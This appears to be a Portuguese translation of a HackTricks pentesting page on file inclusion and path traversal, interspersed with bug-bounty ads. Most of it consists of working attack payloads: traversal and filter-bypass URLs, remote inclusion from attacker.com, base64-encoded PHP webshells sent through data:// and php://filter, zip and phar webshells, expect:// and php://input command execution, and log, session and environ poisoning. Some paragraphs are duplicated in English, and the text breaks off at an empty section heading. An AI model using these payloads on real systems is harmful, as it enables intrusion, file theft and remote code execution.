# Inclus√£o de Arquivo/Travessia de Caminho

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Inclus√£o de Arquivo

**Inclus√£o de Arquivo Remoto (RFI):** O arquivo √© carregado de um servidor remoto (Melhor: voc√™ pode escrever o c√≥digo e o servidor ir√° execut√°-lo). No php isso √© **desativado** por padr√£o (**allow\_url\_include**).\
**Inclus√£o de Arquivo Local (LFI):** O servidor carrega um arquivo local.

A vulnerabilidade ocorre quando o usu√°rio pode controlar de alguma forma o arquivo que ser√° carregado pelo servidor.

Fun√ß√µes PHP vulner√°veis: require, require\_once, include, include\_once

Uma ferramenta interessante para explorar essa vulnerabilidade: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Cegueira - Interessante - Arquivos LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Misturando v√°rias listas de LFI \*nix e adicionando mais caminhos, criei esta:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Tente tamb√©m trocar `/` por `\`\
Tente tamb√©m adicionar `../../../../../`

Uma lista que usa v√°rias t√©cnicas para encontrar o arquivo /etc/password (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mesclando v√°rias listas, criei esta:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Tente tamb√©m trocar `/` por `\`\
Tente tamb√©m remover `C:/` e adicionar `../../../../../`

Uma lista que usa v√°rias t√©cnicas para encontrar o arquivo /boot.ini (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Verifique a lista de LFI do Linux.

## LFI b√°sico e bypasses

Todos os exemplos s√£o para Inclus√£o de Arquivo Local, mas tamb√©m podem ser aplicados √† Inclus√£o de Arquivo Remoto (page=[http://meuserver.com/phpshellcode.txt\\](http://meuserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Sequ√™ncias de travessia removidas de forma n√£o recursiva

When performing a file inclusion vulnerability assessment, it is common to encounter web applications that implement input validation mechanisms to prevent directory traversal attacks. One common technique used to bypass these filters is to strip traversal sequences from the user input in a non-recursive manner.

Durante a realiza√ß√£o de uma avalia√ß√£o de vulnerabilidade de inclus√£o de arquivo, √© comum encontrar aplica√ß√µes web que implementam mecanismos de valida√ß√£o de entrada para evitar ataques de travessia de diret√≥rio. Uma t√©cnica comum usada para contornar esses filtros √© remover as sequ√™ncias de travessia da entrada do usu√°rio de forma n√£o recursiva.

This technique involves repeatedly replacing traversal sequences such as "../" or "..\" with an empty string until no more occurrences are found. By doing so, the attacker can bypass the input validation and access files outside the intended directory.

Essa t√©cnica envolve substituir repetidamente sequ√™ncias de travessia, como "../" ou "..\", por uma string vazia at√© que n√£o haja mais ocorr√™ncias. Ao fazer isso, o atacante pode contornar a valida√ß√£o de entrada e acessar arquivos fora do diret√≥rio pretendido.

It is important to note that this technique may not work in all cases, as some applications may implement more sophisticated input validation mechanisms. Additionally, it is crucial to ensure that the file inclusion vulnerability is present and that exploiting it is within the scope of the authorized penetration test.

√â importante observar que essa t√©cnica pode n√£o funcionar em todos os casos, pois algumas aplica√ß√µes podem implementar mecanismos de valida√ß√£o de entrada mais sofisticados. Al√©m disso, √© crucial garantir que a vulnerabilidade de inclus√£o de arquivo esteja presente e que explor√°-la esteja dentro do escopo do teste de penetra√ß√£o autorizado.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Byte nulo (%00)**

Bypass para adicionar mais caracteres ao final da string fornecida (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Isso est√° **resolvido desde o PHP 5.4**

### **Codifica√ß√£o**

Voc√™ pode usar codifica√ß√µes n√£o padr√£o, como codifica√ß√£o de URL dupla (e outras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### A partir da pasta existente

Talvez o back-end esteja verificando o caminho da pasta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identificando pastas em um servidor

Dependendo do c√≥digo aplicativo / caracteres permitidos, pode ser poss√≠vel explorar recursivamente o sistema de arquivos descobrindo pastas e n√£o apenas arquivos. Para fazer isso:

* identifique a "profundidade" do seu diret√≥rio atual ao recuperar com sucesso `/etc/passwd` (se estiver no Linux):
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* tente adivinhar o nome de uma pasta no diret√≥rio atual adicionando o nome da pasta (aqui, `private`), e depois voltando para `/etc/passwd`:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* se a aplica√ß√£o for vulner√°vel, pode haver dois resultados diferentes para a solicita√ß√£o:
* se voc√™ receber um erro / nenhuma sa√≠da, a pasta `private` n√£o existe neste local
* se voc√™ receber o conte√∫do de `/etc/passwd`, voc√™ validou que de fato existe uma pasta `private` no diret√≥rio atual
* as pastas que voc√™ descobriu usando essas t√©cnicas podem ent√£o ser fuzzed para arquivos (usando um m√©todo cl√°ssico de LFI) ou para subdiret√≥rios usando a mesma t√©cnica recursivamente.

√â poss√≠vel adaptar essa t√©cnica para encontrar diret√≥rios em qualquer localiza√ß√£o no sistema de arquivos. Por exemplo, se, sob a mesma hip√≥tese (diret√≥rio atual com profundidade 3 no sistema de arquivos), voc√™ deseja verificar se `/var/www/` cont√©m um diret√≥rio `private`, use a seguinte carga √∫til:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
A seguinte sequ√™ncia de comandos permite a gera√ß√£o de payloads usando `sed` (1) como entrada para ferramentas de fuzzing de URL, como `ffuf` (2):
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
### **Truncamento de caminho**

Bypassa a adi√ß√£o de mais caracteres no final da string fornecida (bypass de: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Sempre tente **iniciar** o caminho com um diret√≥rio falso (a/).

**Essa vulnerabilidade foi corrigida no PHP 5.3.**

### **Truques de bypass de filtro**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclus√£o Remota de Arquivos

No PHP, isso est√° desabilitado por padr√£o porque a configura√ß√£o **`allow_url_include`** est√° definida como **Off**. Ela precisa estar como **On** para funcionar e, nesse caso, voc√™ poderia incluir um arquivo PHP do seu servidor e obter RCE (Execu√ß√£o Remota de C√≥digo):
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se por algum motivo **`allow_url_include`** estiver **Ativado**, mas o PHP estiver **filtrando** o acesso a p√°ginas da web externas, [conforme este post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), voc√™ pode usar, por exemplo, o protocolo de dados com base64 para decodificar um c√≥digo PHP em base64 e obter RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
No c√≥digo anterior, o `+.txt` final foi adicionado porque o atacante precisava de uma string que terminasse em `.txt`, ent√£o a string termina com isso e ap√≥s a decodifica√ß√£o b64 essa parte retornar√° apenas lixo e o c√≥digo PHP real ser√° inclu√≠do (e, portanto, executado).
{% endhint %}

Outro exemplo **sem usar o protocolo `php://`** seria:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento Raiz do Python

Em python, em um c√≥digo como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se o usu√°rio passar um **caminho absoluto** para **`file_name`**, o **caminho anterior √© simplesmente removido**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
√â o comportamento esperado de acordo com [a documenta√ß√£o](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se um componente for um caminho absoluto, todos os componentes anteriores s√£o descartados e a jun√ß√£o continua a partir do componente de caminho absoluto.

## Listar Diret√≥rios em Java

Parece que se voc√™ tiver uma Traversal de Caminho em Java e **solicitar um diret√≥rio** em vez de um arquivo, ser√° retornada uma **lista do diret√≥rio**. Isso n√£o acontecer√° em outras linguagens (pelo que eu saiba).

## Top 25 par√¢metros

Aqui est√° uma lista dos 25 principais par√¢metros que podem ser vulner√°veis a vulnerabilidades de inclus√£o de arquivo local (LFI) (de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando wrappers e protocolos PHP

### php://filter

Os filtros do PHP permitem realizar opera√ß√µes b√°sicas de **modifica√ß√£o nos dados** antes de serem lidos ou gravados. Existem 5 categorias de filtros:

* [Filtros de String](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Remove as tags dos dados (tudo entre os caracteres "<" e ">")
* Note que este filtro desapareceu das vers√µes modernas do PHP
* [Filtros de Convers√£o](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforma para uma codifica√ß√£o diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obter a **lista de todas as codifica√ß√µes** suportadas, execute no console: `iconv -l`

{% hint style="warning" %}
Abusando do filtro de convers√£o `convert.iconv.*`, voc√™ pode **gerar texto arbitr√°rio**, o que pode ser √∫til para escrever texto arbitr√°rio ou fazer com que uma fun√ß√£o como include processe texto arbitr√°rio. Para mais informa√ß√µes, consulte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de Compress√£o](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprime o conte√∫do (√∫til se estiver extraindo muitas informa√ß√µes)
* `zlib.inflate`: Descomprime os dados
* [Filtros de Criptografia](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Descontinuado
* `mdecrypt.*` : Descontinuado
* Outros Filtros
* Executando `var_dump(stream_get_filters());` no PHP, voc√™ pode encontrar alguns **filtros inesperados**:
* `consumed`
* `dechunk`: reverte a codifica√ß√£o chunked do HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
A parte "php://filter" √© case insensitive
{% endhint %}

### php://fd

Este wrapper permite acessar descritores de arquivo que o processo tem aberto. Potencialmente √∫til para exfiltrar o conte√∫do de arquivos abertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Voc√™ tamb√©m pode usar **php://stdin, php://stdout e php://stderr** para acessar os **descritores de arquivo 0, 1 e 2**, respectivamente (n√£o tenho certeza de como isso poderia ser √∫til em um ataque)

### zip:// e rar://

Fa√ßa o upload de um arquivo Zip ou Rar com um PHPShell dentro e acesse-o.\
Para poder abusar do protocolo rar, **√© necess√°rio ativ√°-lo especificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

A data:// √© uma t√©cnica de inclus√£o de arquivo que explora a capacidade de um aplicativo web de ler dados de um URI (Uniform Resource Identifier). O URI come√ßa com o esquema "data://" e cont√©m os dados que ser√£o lidos pelo aplicativo.

Essa t√©cnica pode ser explorada para incluir arquivos arbitr√°rios no aplicativo web, permitindo que um invasor acesse informa√ß√µes confidenciais ou execute c√≥digo malicioso. O invasor pode fornecer um URI que contenha um arquivo malicioso, como um script PHP, e o aplicativo web ir√° interpret√°-lo como parte do c√≥digo leg√≠timo.

Para evitar a explora√ß√£o da t√©cnica de inclus√£o de arquivo data://, √© importante validar e filtrar cuidadosamente os URIs fornecidos pelos usu√°rios antes de us√°-los para ler dados. Al√©m disso, √© recomend√°vel manter o aplicativo web atualizado com as √∫ltimas corre√ß√µes de seguran√ßa para evitar vulnerabilidades conhecidas que possam ser exploradas.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Fato interessante: voc√™ pode acionar um XSS e contornar o Auditor do Chrome com: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Observe que esse protocolo √© restrito pelas configura√ß√µes do PHP **`allow_url_open`** e **`allow_url_include`**

### expect://

O Expect deve ser ativado. Voc√™ pode executar c√≥digo usando isso.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique sua carga √∫til nos par√¢metros POST
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Um arquivo `.phar` tamb√©m pode ser usado para executar c√≥digo PHP se o site estiver usando alguma fun√ß√£o como `include` para carregar o arquivo.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

E voc√™ pode compilar o `phar` executando a seguinte linha:
```bash
php --define phar.readonly=0 create_path.php
```
Ser√° gerado um arquivo chamado `test.phar` que voc√™ pode usar para abusar do LFI.

Se o LFI estiver apenas lendo o arquivo e n√£o executando o c√≥digo PHP dentro dele, por exemplo, usando fun√ß√µes como _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_**. Voc√™ pode tentar abusar de uma **desserializa√ß√£o** que ocorre ao **ler** um **arquivo** usando o protocolo **phar**.\
Para mais informa√ß√µes, leia o seguinte post:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Mais protocolos

Verifique mais poss√≠veis [**protocolos para incluir aqui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory e php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Escrever na mem√≥ria ou em um arquivo tempor√°rio (n√£o tenho certeza de como isso pode ser √∫til em um ataque de inclus√£o de arquivo)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Acessar o sistema de arquivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Acessar URLs HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Acessar URLs FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Fluxos de compress√£o
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Encontrar nomes de caminho que correspondam ao padr√£o (n√£o retorna nada imprim√≠vel, ent√£o n√£o √© realmente √∫til aqui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Fluxos de √°udio (n√£o √∫til para ler arquivos arbitr√°rios)

## LFI via 'assert' do PHP

Se voc√™ encontrar um LFI dif√≠cil que parece estar filtrando strings de travessia como ".." e respondendo com algo como "Tentativa de invas√£o" ou "Boa tentativa!", uma carga √∫til de inje√ß√£o 'assert' pode funcionar.

Uma carga √∫til como esta:
```
' and die(show_source('/etc/passwd')) or '
```
ir√° explorar com sucesso o c√≥digo PHP para um par√¢metro "file" que se parece com isso:
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
Tamb√©m √© poss√≠vel obter RCE em uma declara√ß√£o "assert" vulner√°vel usando a fun√ß√£o system():
```
' and die(system("whoami")) or '
```
Certifique-se de codificar as cargas √∫teis em URL antes de envi√°-las.

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando seus clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda dos hackers web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Traversal de Caminho Cego em PHP

{% hint style="warning" %}
Essa t√©cnica √© relevante em casos em que voc√™ **controla** o **caminho do arquivo** de uma **fun√ß√£o PHP** que ir√° **acessar um arquivo**, mas voc√™ n√£o ver√° o conte√∫do do arquivo (como uma chamada simples para **`file()`**), mas o conte√∫do n√£o √© mostrado.
{% endhint %}

Neste [**post incr√≠vel**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), √© explicado como uma traversal de caminho cego pode ser abusada por meio do filtro PHP para **extrair o conte√∫do de um arquivo por meio de um or√°culo de erro**.

Em resumo, a t√©cnica usa a codifica√ß√£o **"UCS-4LE"** para tornar o conte√∫do de um arquivo t√£o **grande** que a **fun√ß√£o PHP de abertura** do arquivo ir√° disparar um **erro**.

Em seguida, para vazar o primeiro caractere, o filtro **`dechunk`** √© usado junto com outros, como **base64** ou **rot13**, e finalmente os filtros **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** s√£o usados para **colocar outros caracteres no in√≠cio e vaz√°-los**.

**Fun√ß√µes que podem ser vulner√°veis**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (somente alvo somente leitura com isso)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para obter detalhes t√©cnicos, consulte o post mencionado!

## LFI2RCE

### Inclus√£o Remota de Arquivos

Explicado anteriormente, [**siga este link**](./#remote-file-inclusion).

### Por meio do arquivo de log do Apache/Nginx

Se o servidor Apache ou Nginx for **vulner√°vel a LFI** dentro da fun√ß√£o de inclus√£o, voc√™ pode tentar acessar **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, definir dentro do **agente do usu√°rio** ou dentro de um **par√¢metro GET** um shell php como **`<?php system($_GET['c']); ?>`** e incluir esse arquivo

{% hint style="warning" %}
Observe que, **se voc√™ usar aspas duplas** para o shell em vez de **aspas simples**, as aspas duplas ser√£o modificadas para a string "_**quote;**_", **o PHP lan√ßar√° um erro** l√° e **nada mais ser√° executado**.

Al√©m disso, certifique-se de **escrever corretamente a carga √∫til** ou o PHP gerar√° um erro sempre que tentar carregar o arquivo de log e voc√™ n√£o ter√° uma segunda oportunidade.
{% endhint %}

Isso tamb√©m pode ser feito em outros logs, mas **tenha cuidado**, o c√≥digo dentro dos logs pode estar codificado em URL e isso pode destruir o Shell. O cabe√ßalho **authorisation "basic"** cont√©m "user:password" em Base64 e √© decodificado nos logs. O PHPShell pode ser inserido dentro desse cabe√ßalho.\
Outros poss√≠veis caminhos de log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Lista de palavras para fuzzing: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envie um email** para uma conta interna (user@localhost) contendo seu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e tente incluir o email do usu√°rio com um caminho como **`/var/mail/<NOME_DE_USU√ÅRIO>`** ou **`/var/spool/mail/<NOME_DE_USU√ÅRIO>`**

### Via /proc/\*/fd/\*

1. Fa√ßa o upload de muitos shells (por exemplo: 100)
2. Inclua [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), com $PID = PID do processo (pode ser for√ßado por brute force) e $FD o descritor de arquivo (tamb√©m pode ser for√ßado por brute force)

### Via /proc/self/environ

Como um arquivo de log, envie o payload no User-Agent, ele ser√° refletido dentro do arquivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se voc√™ pode fazer o upload de um arquivo, basta injetar a carga √∫til do shell nele (por exemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para manter o arquivo leg√≠vel, √© melhor injetar nos metadados das imagens/doc/pdf.

### Atrav√©s do upload de arquivo ZIP

Fa√ßa o upload de um arquivo ZIP contendo um shell PHP comprimido e acesse:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via sess√µes PHP

Verifique se o site utiliza sess√µes PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Em PHP, essas sess√µes s√£o armazenadas em arquivos _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Defina o cookie como `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# Inclus√£o de Arquivo Local (LFI) para incluir o arquivo de sess√£o PHP

A Inclus√£o de Arquivo Local (LFI) √© uma t√©cnica de hacking que permite a um invasor incluir arquivos arbitr√°rios em um aplicativo da web. Neste caso, vamos explorar a LFI para incluir o arquivo de sess√£o PHP.

## Passo 1: Identificar a vulnerabilidade LFI

O primeiro passo √© identificar se o aplicativo da web √© vulner√°vel √† LFI. Isso pode ser feito inserindo um caminho de arquivo arbitr√°rio em um par√¢metro de URL que espera um arquivo para inclus√£o. Por exemplo:

```
http://example.com/page.php?file=/etc/passwd
```

Se o conte√∫do do arquivo `/etc/passwd` for exibido na p√°gina, isso indica uma vulnerabilidade LFI.

## Passo 2: Incluir o arquivo de sess√£o PHP

Uma vez identificada a vulnerabilidade LFI, podemos usar essa t√©cnica para incluir o arquivo de sess√£o PHP. O arquivo de sess√£o PHP geralmente √© armazenado em um local espec√≠fico, como `/var/lib/php/sessions/`. Podemos tentar inclu√≠-lo da seguinte maneira:

```
http://example.com/page.php?file=/var/lib/php/sessions/sess_<session_id>
```

Substitua `<session_id>` pelo ID da sess√£o PHP que voc√™ deseja incluir. Se a inclus√£o for bem-sucedida, o conte√∫do do arquivo de sess√£o ser√° exibido na p√°gina.

## Consequ√™ncias da inclus√£o do arquivo de sess√£o PHP

Ao incluir o arquivo de sess√£o PHP, um invasor pode obter acesso √†s informa√ß√µes armazenadas na sess√£o, como credenciais de login, tokens de autentica√ß√£o e outros dados sens√≠veis. Isso pode levar a ataques de sess√£o, comprometendo a seguran√ßa do aplicativo da web.

## Medidas de prote√ß√£o

